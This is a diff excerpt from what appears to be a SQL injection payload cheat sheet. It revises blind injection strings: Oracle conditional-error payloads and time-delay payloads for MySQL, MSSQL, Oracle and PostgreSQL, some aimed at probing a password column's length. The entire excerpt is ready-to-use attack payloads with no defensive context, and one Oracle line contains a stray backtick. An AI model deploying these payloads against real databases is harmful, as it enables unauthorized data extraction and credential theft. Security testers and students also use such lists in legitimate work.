@@ -60,14 +60,14 @@
 #### With Conditional Errors
 ```
 ● Oracle                        : ' || (SELECT NULL FROM put_table_name_here WHERE ROWNUM = 1) || ' --
-                                  ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM put_table_name_here WHERE username='put_username_here') || ' --
-                                  ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM put_table_name_here WHERE username='put_username_here' AND LENGTH(password)>1 ) || ' --
+                                  ' || (SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM put_table_name_here WHERE username='put_username_here') || ' --
+                                  ' || (SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM put_table_name_here WHERE username='put_username_here' AND LENGTH(password)>1 ) || ' --
 ```
-#### With Time Delays
+#### With Conditional Time Delays
 ```
-● MySQL                         : ' || (SELECT sleep(10))--
-● MSSQL                         : ' || (WAITFOR DELAY '0:0:10')--
-● Oracle                        : ' || (dbms_pipe.receive_message(('a'),10))--
-● PostgreSQL                    : ' || (SELECT pg_sleep(10))--
+● MySQL                         : ' AND (SELECT IF(condition, SLEEP(10), 'a'))--
+● MSSQL                         : '; (IF (condition) WAITFOR DELAY '0:0:10')--
+● Oracle                        : ' || (SELECT CASE WHEN (condition) THEN dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual`)--
+● PostgreSQL                    : ' || (SELECT CASE WHEN (condition) THEN pg_sleep(5) ELSE pg_sleep(0) END) || '--
 ```
 #### 
